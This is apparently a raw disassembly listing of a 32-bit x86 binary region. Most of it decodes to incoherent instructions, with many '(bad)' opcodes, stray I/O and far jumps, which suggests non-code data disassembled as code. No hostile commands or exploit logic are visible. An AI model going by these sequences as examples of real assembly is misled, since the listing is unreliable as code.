  42ee0b:	add    DWORD PTR [edx-0x19fbd0fb],ebx
  42ee11:	adc    bh,bl
  42ee13:	sahf   
  42ee14:	dec    ebx
  42ee15:	fidiv  WORD PTR [esi+edx*2+0x37]
  42ee19:	mov    eax,ds:0x3908ec65
  42ee1e:	sahf   
  42ee1f:	sbb    al,0x3e
  42ee21:	daa    
  42ee22:	sbb    DWORD PTR [eax],edi
  42ee24:	arpl   dx,ax
  42ee26:	add    al,0xc3
  42ee28:	arpl   WORD PTR [edx-0x80],bx
  42ee2b:	jge    0x42edf7
  42ee2d:	stos   BYTE PTR es:[edi],al
  42ee2e:	loop   0x42ee6e
  42ee30:	lods   al,BYTE PTR ds:[esi]
  42ee31:	inc    edi
  42ee32:	mov    eax,0x10b669a2
  42ee37:	inc    ebx
  42ee38:	(bad)  
  42ee39:	ins    DWORD PTR es:[edi],dx
  42ee3a:	psllq  mm5,0x1f
  42ee3e:	scas   al,BYTE PTR es:[edi]
  42ee3f:	jnp    0x42ee02
  42ee41:	jae    0x42ee71
  42ee43:	dec    edx
  42ee44:	xor    eax,0x9c2ba3d3
  42ee49:	mov    al,0x9
  42ee4b:	mov    esp,DWORD PTR [esi+0x6e559ec3]
  42ee51:	scas   al,BYTE PTR es:[edi]
  42ee52:	mov    WORD PTR [ecx],gs
  42ee54:	xchg   ebx,eax
  42ee55:	add    BYTE PTR [ecx-0x26],0x0
  42ee59:	(bad)  
  42ee5a:	jmp    0x2be54dc0
  42ee5f:	das    
  42ee60:	(bad)  
  42ee61:	and    BYTE PTR [edi-0x23ea36f],bl
  42ee67:	add    ebx,ebx
  42ee69:	ror    BYTE PTR [eax+0x62],0xca
  42ee6d:	pop    esp
  42ee6e:	inc    edx
  42ee6f:	pop    ebp
  42ee70:	adc    al,0xfc
  42ee72:	out    0x3a,al
  42ee74:	sub    dl,ch
  42ee76:	(bad)  
  42ee77:	nop
  42ee78:	dec    eax
  42ee79:	mov    al,0xb4
  42ee7b:	xchg   BYTE PTR [ebp-0x5f7bd4cd],dl
  42ee81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee82:	and    DWORD PTR [esi+0xbbf20e1],esi
  42ee88:	xchg   ecx,eax
  42ee89:	push   ss
  42ee8a:	ins    BYTE PTR es:[edi],dx
  42ee8b:	pop    ds
  42ee8c:	cmp    eax,0xd432ba
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef01:	aad    0xfb
  42ef03:	pop    ds
  42ef04:	pop    esp
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef0d:	out    0xc,eax
  42ef0f:	loop   0x42ef5e
  42ef11:	rcl    BYTE PTR [ebp+0x21bf37aa],0xe7
  42ef18:	sbb    BYTE PTR [edi-0x7cd17c2c],dl
  42ef1e:	mov    ch,0x7b
  42ef20:	fmul   DWORD PTR [edi-0x5]
  42ef23:	push   esp
  42ef24:	stos   BYTE PTR es:[edi],al
  42ef25:	je     0x42ef3d
  42ef27:	stc    
  42ef28:	retf   
  42ef29:	or     ecx,DWORD PTR [ebx+0x5a37084c]
  42ef2f:	xor    BYTE PTR [edx+0x13b489a6],ah
  42ef35:	inc    edi
  42ef36:	jge    0x42ef94
  42ef38:	call   0x652e2671
  42ef3d:	pop    ebp
  42ef3e:	sahf   
  42ef3f:	or     ebp,DWORD PTR [ebx-0x2eaabb29]
  42ef45:	push   cs
  42ef46:	ins    DWORD PTR es:[edi],dx
  42ef47:	lock repz inc edx
  42ef4a:	mov    eax,edi
  42ef4c:	xchg   BYTE PTR [eax+0x102ca4fa],dh
  42ef52:	pop    ss
  42ef53:	in     al,dx
  42ef54:	jnp    0x42eeee
  42ef56:	fidivr WORD PTR [ebp-0x3b]
  42ef59:	sahf   
  42ef5a:	or     eax,0x74668ac5
  42ef5f:	sub    BYTE PTR [edx-0x757b9e7b],dh
  42ef65:	push   cs
  42ef66:	and    DWORD PTR [esi+0x5e],edx
  42ef69:	sbb    esi,ebp
  42ef6b:	dec    eax
  42ef6c:	jo     0x42ef48
  42ef6e:	addr16 jmp 0x42efc5
  42ef71:	push   edx
  42ef72:	enter  0x4b13,0xbe
  42ef76:	jmp    0x697f:0xa6c218be
  42ef7d:	sub    bh,ch
  42ef7f:	(bad)  [ecx-0x48]
  42ef82:	mov    ecx,DWORD PTR [esi+0x17]
  42ef85:	mov    ebp,eax
  42ef87:	xor    eax,0x23e3c2fd
  42ef8c:	mov    ds:0x9673c6bf,al
  42ef91:	int3   
  42ef92:	sbb    eax,0x72519009
  42ef97:	sbb    al,0xd0
  42ef99:	cs jo  0x42ef83
  42ef9c:	sbb    BYTE PTR [edi+ecx*8],cl
  42ef9f:	dec    edx
  42efa0:	shl    BYTE PTR [ecx+edi*8],cl
  42efa3:	push   ss
  42efa4:	xor    BYTE PTR [edx+0x24],0x32
  42efa8:	cmp    al,0x53
  42efaa:	and    bh,BYTE PTR [eax+0x7f]
  42efad:	aad    0x65
  42efaf:	or     esi,0x18ea1ffb
  42efb5:	inc    ecx
  42efb6:	call   0x11511e87
  42efbb:	xor    DWORD PTR [esi+0x23],ebp
  42efbe:	xchg   esp,esp
  42efc0:	mov    ebp,0xde3136b3
  42efc5:	(bad)  
  42efc6:	adc    eax,0x275b29ab
  42efcb:	outs   dx,BYTE PTR ds:[esi]
  42efcc:	and    eax,0x33b446f8
  42efd1:	dec    eax
  42efd2:	shr    BYTE PTR [ebx+0x7aeff4f1],0x40
  42efd9:	stos   DWORD PTR es:[edi],eax
  42efda:	and    ebp,edx
  42efdc:	sbb    ah,BYTE PTR [ebx-0x6c171f1b]
  42efe2:	and    BYTE PTR [ebx-0x16],dh
  42efe5:	fs rol esi,0xf6
  42efe9:	or     al,0xa3
  42efeb:	and    dl,BYTE PTR [ecx-0x69]
  42efee:	shl    DWORD PTR [ecx+0x57],cl
  42eff1:	nop
  42eff2:	xchg   ebx,eax
  42eff3:	add    bl,cl
  42eff5:	(bad)  
  42eff6:	sbb    bh,bl
  42eff8:	in     al,0xc0
  42effa:	xchg   esi,eax
  42effb:	xchg   edx,esi
  42effd:	dec    edi
  42effe:	fsubr  DWORD PTR [ecx+0x36]
  42f001:	(bad)  
  42f002:	out    dx,eax
  42f003:	jmp    0x42efee
  42f005:	outs   dx,BYTE PTR ds:[esi]
  42f006:	out    0x76,eax
  42f008:	mov    bl,0x8a
  42f00a:	into   
  42f00b:	xchg   ecx,eax
  42f00c:	pushf  
  42f00d:	or     ah,dh
  42f00f:	mov    ch,0x0
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	mov    DWORD PTR [edx+edx*1-0xe],ebp
  42f084:	pusha  
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [edx],ch
  42f08d:	xlat   BYTE PTR ds:[ebx]
  42f08e:	int3   
  42f08f:	fcmove st,st(5)
  42f091:	mul    DWORD PTR [eax+0x24373e8e]
  42f097:	or     al,0x6d
  42f099:	fidivr WORD PTR [esi-0x1a68c461]
  42f09f:	fadd   QWORD PTR [ecx+0x47]
  42f0a2:	push   ebp
  42f0a3:	lods   eax,DWORD PTR ds:[esi]
  42f0a4:	pop    esp
  42f0a5:	call   0x3994d5f0
  42f0aa:	push   ds
  42f0ab:	dec    eax
  42f0ac:	dec    ebp
  42f0ad:	push   0xca76ad27
  42f0b2:	push   ebx
  42f0b3:	(bad)  
  42f0b4:	sub    al,0x43
  42f0b6:	add    bh,BYTE PTR [ebx+0x35]
  42f0b9:	outs   dx,DWORD PTR ds:[esi]
  42f0ba:	pop    eax
  42f0bb:	out    0xc5,al
  42f0bd:	fwait
  42f0be:	jp     0x42f0cd
  42f0c0:	mov    bl,0x31
  42f0c2:	hlt    
  42f0c3:	sar    BYTE PTR [ebp+0x494d953b],0xd
  42f0ca:	push   edi
  42f0cb:	cli    
  42f0cc:	inc    ebx
  42f0cd:	(bad)
  42f0d0:	push   ecx
  42f0d1:	(bad)  
  42f0d2:	pop    esp
  42f0d3:	sahf   
  42f0d4:	cmc    
  42f0d5:	enter  0x50ca,0x51
  42f0d9:	std    
  42f0da:	out    dx,al
  42f0db:	add    BYTE PTR gs:[ebx+0x16],cl
  42f0df:	jo     0x42f12e
  42f0e1:	mov    ch,BYTE PTR [ebx-0x4ccabab9]
  42f0e7:	adc    edx,DWORD PTR [ebp+0x54]
  42f0ea:	lahf   
  42f0eb:	xor    BYTE PTR [edi+ebp*1+0x6],ch
  42f0ef:	arpl   WORD PTR [ecx+0x758db167],bp
  42f0f5:	prefetchwt1 (bad)
  42f0f6:	or     eax,0xd0437ad1
  42f0fb:	bound  ecx,QWORD PTR [ebx]
  42f0fd:	cmp    ecx,DWORD PTR [ecx-0x282159ae]
  42f103:	mov    WORD PTR [ebx-0x6f],?
  42f106:	cmc    
  42f107:	push   ss
  42f108:	cwde   
  42f109:	add    BYTE PTR [ebx-0x3a],al
  42f10c:	ds aas 
  42f10e:	xor    esp,DWORD PTR [ecx+0x44f87bd4]
  42f114:	cwde   
  42f115:	xchg   ebp,eax
  42f116:	inc    esi
  42f117:	jmp    0x42f129
  42f119:	call   0x33578fe7
  42f11e:	cld    
  42f11f:	sub    DWORD PTR [edx+0x63834433],esp
  42f125:	and    cl,BYTE PTR [esi+esi*2+0x287db4fd]
  42f12c:	les    ebp,FWORD PTR [eax]
  42f12e:	sbb    bl,0xf5
  42f131:	push   esi
  42f132:	mov    eax,0x208eae9f
  42f137:	or     ebx,DWORD PTR [ecx]
  42f139:	or     al,0x2
  42f13b:	mov    eax,ds:0x81354a11
  42f140:	push   ss
  42f141:	mov    edx,0x28ea8366
  42f146:	mov    eax,0x31fb069f
  42f14b:	and    al,0x28
  42f14d:	pop    ecx
  42f14e:	(bad)  
  42f14f:	sub    BYTE PTR ds:0x7a8bc051,bh
  42f155:	add    edx,DWORD PTR [eax-0x4a3db6e9]
  42f15b:	inc    edx
  42f15c:	xor    eax,DWORD PTR [ebx+0x67]
  42f15f:	push   0x2401d211
  42f164:	and    ebp,0x2467d76b
  42f16a:	stos   BYTE PTR es:[edi],al
  42f16b:	loopne 0x42f0f7
  42f16d:	jg     0x42f126
  42f16f:	xchg   esp,eax
  42f170:	jmp    0x42f120
  42f172:	inc    ecx
  42f173:	ins    DWORD PTR es:[edi],dx
  42f174:	cdq    
  42f175:	loope  0x42f1d4
  42f177:	fsub   QWORD PTR ds:0x35324013
  42f17d:	sbb    edi,DWORD PTR [edx]
  42f17f:	test   BYTE PTR [ecx+eiz*2+0x70],0x4d
  42f184:	cli    
  42f185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f186:	std    
  42f187:	(bad)
  42f18b:	lods   eax,DWORD PTR ds:[esi]
  42f18c:	push   esi
  42f18d:	enter  0xc6a7,0x0
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	imul   edi,eax,0xf8644f6d
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	xchg   ebx,eax
  42f20d:	ret    0xdd79
  42f210:	or     BYTE PTR [ecx],0x56
  42f213:	je     0x42f1b5
  42f215:	test   BYTE PTR [eax-0x4a],bl
  42f218:	add    eax,0x5486d57f
  42f21d:	rcl    DWORD PTR [ecx],0xc0
  42f220:	ss and eax,0x935b60e1
  42f226:	cld    
  42f227:	daa    
  42f228:	sbb    eax,0x8710cdfc
  42f22d:	cmp    DWORD PTR [eax-0x45ea731e],ecx
  42f233:	fistp  QWORD PTR [edi+0x320a275d]
  42f239:	das    
  42f23a:	xchg   esp,eax
  42f23b:	sub    eax,0x874b3665
  42f240:	push   ds
  42f241:	adc    ch,BYTE PTR [ecx+0xf]
  42f244:	ds cmp ch,dl
  42f247:	mov    eax,DWORD PTR [ebx-0x3acb1bfb]
  42f24d:	pop    esp
  42f24e:	stos   DWORD PTR es:[edi],eax
  42f24f:	out    0xeb,al
  42f251:	in     eax,0x7
  42f253:	fwait
  42f254:	add    DWORD PTR [edi],ebp
  42f256:	hlt    
  42f257:	loope  0x42f256
  42f259:	and    DWORD PTR [ebx+edx*4-0x26],esp
  42f25d:	ins    DWORD PTR es:[edi],dx
  42f25e:	push   edx
  42f25f:	jbe    0x42f280
  42f261:	cmp    ecx,eax
  42f263:	xor    DWORD PTR [esi+0x5f57dbf6],eax
  42f269:	push   ecx
  42f26a:	jno    0x42f284
  42f26c:	sub    DWORD PTR [esi-0x213d00c4],0xffffff88
  42f273:	xchg   edi,eax
  42f274:	lahf   
  42f275:	dec    esp
  42f276:	mov    ecx,0x8bac6f45
  42f27b:	adc    eax,0xff02ed9c
  42f280:	jno    0x42f245
  42f282:	add    eax,0xa4d1116d
  42f287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f288:	push   es
  42f289:	nop
  42f28a:	daa    
  42f28b:	cmp    cl,BYTE PTR [edx+ebx*4]
  42f28e:	fimul  WORD PTR [edi-0x544b7677]
  42f294:	pushf  
  42f295:	cmp    eax,DWORD PTR [esi-0x61db97f8]
  42f29b:	in     eax,dx
  42f29c:	xchg   edi,eax
  42f29d:	mov    ebp,DWORD PTR [eax+esi*2+0x9]
  42f2a1:	and    DWORD PTR [edi-0x54c76ab],ebx
  42f2a7:	aad    0x41
  42f2a9:	or     bh,BYTE PTR [edi+0x47]
  42f2ac:	stos   BYTE PTR es:[edi],al
  42f2ad:	pop    ds
  42f2ae:	test   DWORD PTR [ecx],ebx
  42f2b0:	fiadd  WORD PTR [esp+edx*2-0x5684e0ab]
  42f2b7:	or     ecx,eax
  42f2b9:	loopne 0x42f2a1
  42f2bb:	cmp    eax,0x3f7b48c8
  42f2c0:	push   edi
  42f2c1:	push   ds
  42f2c2:	shr    BYTE PTR [esi+0x54fd02a0],cl
  42f2c8:	xor    al,BYTE PTR [eax]
  42f2ca:	add    al,0xf8
  42f2cc:	mov    edi,0xa31b96f3
  42f2d1:	and    bh,BYTE PTR [edi-0x4ad5d5ba]
  42f2d7:	and    DWORD PTR ds:0xa582738,ebp
  42f2dd:	mov    dh,0x84
  42f2df:	sub    al,0x89
  42f2e1:	mov    eax,ds:0x5c4400e5
  42f2e6:	imul   edx,ecx,0xffffffa6
  42f2e9:	mov    dl,0x5
  42f2eb:	sbb    al,0x32
  42f2ed:	aas    
  42f2ee:	mov    ah,0x4e
  42f2f0:	shr    bh,cl
  42f2f2:	test   bl,0xfc
  42f2f5:	pop    ebp
  42f2f6:	stc    
  42f2f7:	cs push es
  42f2f9:	test   DWORD PTR [ebp+0x2e],esp
  42f2fc:	push   edi
  42f2fd:	test   edx,0x4e717227
  42f303:	pop    ebx
  42f304:	sub    al,0xbe
  42f306:	js     0x42f29a
  42f308:	aad    0xf6
  42f30a:	mov    al,0x5c
  42f30c:	pop    ebx
  42f30d:	out    dx,al
  42f30e:	xchg   ebx,eax
  42f30f:	daa    
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	(bad)  [ecx+0x42]
  42f383:	dec    ecx
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    BYTE PTR [edi],dl
  42f38d:	ror    al,cl
  42f38f:	dec    ebp
  42f390:	aad    0xc1
  42f392:	ds push ds
  42f394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f395:	add    ch,BYTE PTR [edi]
  42f397:	shl    ch,0xb0
  42f39a:	jnp    0x42f372
  42f39c:	retf   
  42f39d:	enter  0x9472,0xb2
  42f3a1:	mov    bl,0x1b
  42f3a3:	jl     0x42f352
  42f3a5:	js     0x42f369
  42f3a7:	and    edx,DWORD PTR [eax+0x2b]
  42f3aa:	arpl   WORD PTR [ecx],si
  42f3ac:	jo     0x42f344
  42f3ae:	stc    
  42f3af:	dec    edi
  42f3b0:	adc    ch,bh
  42f3b2:	xor    al,0x2
  42f3b4:	mov    ds,WORD PTR [ecx-0x6d]
  42f3b7:	addr16 pusha 
  42f3b9:	adc    al,0x37
  42f3bb:	fcomp  QWORD PTR [ebp+0x38]
  42f3be:	stos   BYTE PTR es:[edi],al
  42f3bf:	dec    eax
  42f3c0:	clc    
  42f3c1:	(bad)  
  42f3c2:	out    dx,al
  42f3c3:	ins    BYTE PTR es:[edi],dx
  42f3c4:	fadd   DWORD PTR [ecx+0x267a400b]
  42f3ca:	out    dx,al
  42f3cb:	push   edx
  42f3cc:	mov    ebp,DWORD PTR [ecx-0x3]
  42f3cf:	(bad)
  42f3d2:	(bad)  
  42f3d3:	sbb    DWORD PTR [ebx+0x11],esi
  42f3d6:	xchg   ebx,eax
  42f3d7:	pop    ss
  42f3d8:	cdq    
  42f3d9:	clc    
  42f3da:	xor    ah,al
  42f3dc:	daa    
  42f3dd:	mov    esp,0xf7e9ab50
  42f3e2:	mov    WORD PTR [edi+edi*4],gs
  42f3e5:	and    DWORD PTR [ebp-0x1f],esi
  42f3e8:	cmp    bl,BYTE PTR [edi-0x49262a16]
  42f3ee:	aad    0x13
  42f3f0:	and    DWORD PTR [esi+esi*2+0x19b7d494],ebx
  42f3f7:	jbe    0x42f456
  42f3f9:	and    BYTE PTR ds:0xa2e7d4d4,al
  42f3ff:	dec    ebp
  42f400:	mov    dh,0xa4
  42f402:	rcl    BYTE PTR [ecx],cl
  42f404:	mov    ecx,0x886991b8
  42f409:	ret    
  42f40a:	mov    bh,0xc1
  42f40c:	push   edx
  42f40d:	pop    esp
  42f40e:	fdivr  QWORD PTR [ebx]
  42f410:	fnstcw WORD PTR [eax-0x56]
  42f413:	sub    al,0x75
  42f415:	dec    ecx
  42f416:	fs retf 
  42f418:	sbb    bh,bl
  42f41a:	cdq    
  42f41b:	inc    edx
  42f41c:	mov    eax,0xcce70743
  42f421:	mov    cl,0x6b
  42f423:	in     eax,0xf2
  42f425:	or     cl,BYTE PTR [edx-0x4dd79b80]
  42f42b:	mov    bh,0xbe
  42f42d:	pop    ebx
  42f42e:	daa    
  42f42f:	inc    edi
  42f430:	jecxz  0x42f46a
  42f432:	jns    0x42f416
  42f434:	fs pop edx
  42f436:	ins    DWORD PTR es:[edi],dx
  42f437:	jbe    0x42f419
  42f439:	xor    ch,BYTE PTR [ecx]
  42f43b:	lods   al,BYTE PTR ds:[esi]
  42f43c:	popf   
  42f43d:	int3   
  42f43e:	inc    eax
  42f43f:	xchg   BYTE PTR ds:0x6dcfd3e5,cl
  42f445:	fst    st(0)
  42f447:	mov    eax,ds:0xa002a57a
  42f44c:	dec    ebx
  42f44d:	arpl   WORD PTR [ebp+0x1],sp
  42f450:	push   esi
  42f451:	js     0x42f3d9
  42f453:	fst    DWORD PTR [ebx+esi*4-0x4e5b0f42]
  42f45a:	out    0x4a,eax
  42f45c:	jg     0x42f41f
  42f45e:	clc    
  42f45f:	mov    WORD PTR [ebp+0x5e],ss
  42f462:	inc    DWORD PTR [esi-0x72e76e7c]
  42f468:	dec    ebx
  42f469:	imul   ebx,edx,0xaa67d2ef
  42f46f:	dec    esi
  42f470:	mov    dh,0xa6
  42f472:	stos   DWORD PTR es:[edi],eax
  42f473:	imul   edi,DWORD PTR [ebx],0xffffffb6
  42f476:	popf   
  42f477:	mov    cl,0x17
  42f479:	jb     0x42f493
  42f47b:	loop   0x42f49b
  42f47d:	(bad)  
  42f47e:	iret   
  42f47f:	or     al,0x78
  42f481:	push   edi
  42f482:	add    eax,0xcd1ac589
  42f487:	add    ch,bl
  42f489:	add    BYTE PTR [eax+0x64],cl
  42f48c:	les    edi,FWORD PTR [edx]
  42f48e:	nop
  42f48f:	mov    al,0x0
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	xchg   edi,eax
  42f501:	push   eax
  42f502:	aad    0xc1
  42f504:	ins    BYTE PTR es:[edi],dx
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	sbb    al,0x86
  42f50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f50f:	pop    ss
  42f510:	test   eax,0x50f894d5
  42f515:	ftst   
  42f517:	std    
  42f518:	aas    
  42f519:	out    0x40,al
  42f51b:	mov    cs,WORD PTR [eax-0x55]
  42f51e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f51f:	cdq    
  42f520:	xlat   BYTE PTR ds:[ebx]
  42f521:	pop    esi
  42f522:	mov    ah,0xce
  42f524:	in     eax,0xa8
  42f526:	(bad)  
  42f527:	nop
  42f528:	mov    eax,0x2d9d5d80
  42f52d:	sti    
  42f52e:	mov    al,ds:0x385c68e2
  42f533:	pop    ecx
  42f534:	jecxz  0x42f52d
  42f536:	ss add ah,bl
  42f539:	fidivr WORD PTR [esi+0xf7def6c]
  42f53f:	cdq    
  42f540:	xor    BYTE PTR [ebx],dh
  42f542:	les    edi,FWORD PTR [ebx+edx*2-0x7f]
  42f546:	push   esp
  42f547:	push   edx
  42f548:	xchg   esp,eax
  42f549:	and    DWORD PTR [ebx-0x2f71bb88],ebp
  42f54f:	xor    BYTE PTR [esi],ch
  42f551:	push   eax
  42f552:	inc    ebx
  42f553:	sahf   
  42f554:	push   ds
  42f555:	in     al,dx
  42f556:	stos   BYTE PTR es:[edi],al
  42f557:	mov    edx,0x3860a077
  42f55c:	into   
  42f55d:	fadd   st,st(6)
  42f55f:	fimul  DWORD PTR [ebx-0x3f]
  42f562:	sub    al,0x7a
  42f564:	sub    eax,0xc99241c7
  42f569:	pop    es
  42f56a:	pop    eax
  42f56b:	cs add ebx,ecx
  42f56e:	push   ecx
  42f56f:	fnstsw WORD PTR [ebx]
  42f571:	push   ebp
  42f572:	fdiv   st(5),st
  42f574:	mov    ds,WORD PTR cs:[ebp+0x45c7ac11]
  42f57b:	pop    edi
  42f57c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f57d:	out    0x4b,eax
  42f57f:	mov    al,0x99
  42f581:	jb     0x42f551
  42f583:	dec    edi
  42f584:	mov    eax,0xbdfc0f5a
  42f589:	je     0x42f5cb
  42f58b:	cld    
  42f58c:	fidiv  WORD PTR [ebx-0x4342cedf]
  42f592:	mov    esi,0x5d37ee8b
  42f597:	out    0xf5,al
  42f599:	dec    esp
  42f59a:	xchg   BYTE PTR [ebp-0x60],bh
  42f59d:	add    eax,0x9c54b7af
  42f5a2:	loope  0x42f54c
  42f5a4:	out    dx,al
  42f5a5:	pop    edi
  42f5a6:	push   ds
  42f5a7:	lods   al,BYTE PTR ds:[esi]
  42f5a8:	cmp    al,0xa3
  42f5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5ab:	mov    ds:0x5691099f,al
  42f5b0:	stos   DWORD PTR es:[edi],eax
  42f5b1:	push   edi
  42f5b2:	inc    esi
  42f5b3:	jno    0x42f5a7
  42f5b5:	mov    edi,0xdf220c7f
  42f5ba:	inc    ecx
  42f5bb:	mov    ds:0xe28ffb16,eax
  42f5c0:	stos   DWORD PTR es:[edi],eax
  42f5c1:	sbb    eax,0x6c25b77d
  42f5c6:	(bad)  
  42f5c7:	push   ss
  42f5c8:	mov    ecx,0xc3e01c85
  42f5cd:	aad    0x35
  42f5cf:	popa   
  42f5d0:	call   0x3c24:0xbd4599b3
  42f5d7:	test   al,0xae
  42f5d9:	dec    esi
  42f5da:	mov    esp,0x7c5b0975
  42f5df:	sahf   
  42f5e0:	push   ebx
  42f5e1:	idiv   BYTE PTR [edi]
  42f5e3:	push   ss
  42f5e4:	inc    esi
  42f5e5:	xchg   DWORD PTR [eax],esi
  42f5e7:	dec    ecx
  42f5e8:	jle    0x42f5a9
  42f5ea:	push   edi
  42f5eb:	push   ds
  42f5ec:	cdq    
  42f5ed:	sbb    BYTE PTR [ebp+0x7a9ec2bf],ch
  42f5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5f4:	lahf   
  42f5f5:	jbe    0x42f602
  42f5f7:	adc    eax,0xbb1ba5ca
  42f5fc:	xor    eax,0x34d1d18d
  42f601:	ds mov ch,0x56
  42f604:	mov    ch,0x22
  42f606:	xor    dh,BYTE PTR [eax-0x3ee2a29f]
  42f60c:	js     0x42f605
  42f60e:	and    DWORD PTR [ebp+0x0],edx
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	loop   0x42f631
  42f682:	mov    eax,ds:0x1fb700f
  42f687:	add    BYTE PTR [ecx+eax*1],al
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	imul   BYTE PTR [edi]
  42f68e:	push   eax
  42f68f:	ret    
  42f690:	push   cs
  42f691:	pop    edi
  42f692:	imul   ecx,DWORD PTR [ecx],0xffffffbd
  42f695:	mov    dl,0x6a
  42f697:	adc    DWORD PTR [edi-0x4f7e440a],eax
  42f69d:	in     eax,dx
  42f69e:	lahf   
  42f69f:	repz xor al,0x1
  42f6a2:	cwde   
  42f6a3:	int3   
  42f6a4:	stc    
  42f6a5:	rol    BYTE PTR [edx+0x2524d4a8],cl
  42f6ab:	fisub  WORD PTR [esi]
  42f6ad:	repz jge 0x42f6c3
  42f6b0:	mov    cl,0x9c
  42f6b2:	(bad)  
  42f6b3:	enter  0x52f5,0x12
  42f6b7:	sti    
  42f6b8:	cmp    eax,0x593d4930
  42f6bd:	xchg   ecx,eax
  42f6be:	jae    0x42f6f1
  42f6c0:	jne    0x42f6dc
  42f6c2:	adc    eax,0xcfab9286
  42f6c7:	jecxz  0x42f690
  42f6c9:	and    eax,DWORD PTR [ebp+esi*4-0x84ef292]
  42f6d0:	mov    esi,0xbc42b174
  42f6d5:	enterw 0xaf11,0x3a
  42f6da:	mov    DWORD PTR [edi+0x55d7bce2],edi
  42f6e0:	push   cs
  42f6e1:	fld    QWORD PTR [edi]
  42f6e3:	jnp    0x42f67a
  42f6e5:	lods   eax,DWORD PTR ds:[esi]
  42f6e6:	jmp    0xb98e:0x1ccbd01f
  42f6ed:	adc    DWORD PTR [ecx-0x30da9efd],edi
  42f6f3:	imul   esp,edx,0x64
  42f6f6:	xor    BYTE PTR [ecx+0x5e],cl
  42f6f9:	imul   bh
  42f6fb:	aam    0xcc
  42f6fd:	popf   
  42f6fe:	mov    al,0x51
  42f700:	and    edi,edi
  42f702:	mov    edi,0xa760f6ad
  42f707:	in     al,0x1d
  42f709:	fdecstp 
  42f70b:	stos   DWORD PTR es:[edi],eax
  42f70c:	jge    0x42f727
  42f70e:	clc    
  42f70f:	jmp    0x4722:0xf5456c17
  42f716:	(bad)  
  42f717:	call   0x97e62d6
  42f71c:	je     0x42f72f
  42f71e:	addr16 mov bh,0xfe
  42f721:	test   DWORD PTR [eax],esp
  42f723:	jge    0x42f725
  42f725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f726:	mov    DWORD PTR [esi],esp
  42f728:	in     al,0xe
  42f72a:	or     al,0x4b
  42f72c:	mov    edx,0x5ade41f1
  42f731:	in     eax,dx
  42f732:	adc    BYTE PTR [ebp+0x38940dee],cl
  42f738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f739:	div    BYTE PTR ds:0xb81b8838
  42f73f:	and    al,0xd1
  42f741:	inc    esp
  42f742:	jl     0x42f74f
  42f744:	out    dx,eax
  42f745:	mov    ds:0x1c24035a,al
  42f74a:	int    0x66
  42f74c:	fcom   QWORD PTR [ebx+0x65]
  42f74f:	in     al,0x83
  42f751:	pop    ds
  42f752:	xchg   edx,eax
  42f753:	imul   edi,DWORD PTR [eax-0x6edae66],0xba0bb1f4
  42f75d:	mov    DWORD PTR [edx-0x695fecaa],ebx
  42f763:	add    edx,0xc64dbcdf
  42f769:	aas    
  42f76a:	inc    ecx
  42f76b:	mov    al,al
  42f76d:	jg     0x42f7af
  42f76f:	imul   ebx,DWORD PTR [edi-0x7437cd31],0x33
  42f776:	jae    0x42f7ea
  42f778:	cmp    ah,BYTE PTR [eax+0x6d67c6f5]
  42f77e:	(bad)  
  42f77f:	(bad)  
  42f780:	jbe    0x42f7f1
  42f782:	lock std 
  42f784:	push   ebx
  42f785:	inc    ebx
  42f786:	sub    bh,BYTE PTR [esi+0x4c]
  42f789:	jno    0x42f74c
  42f78b:	in     al,dx
  42f78c:	jg     0x42f7a3
  42f78e:	movhps xmm0,QWORD PTR [eax]
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
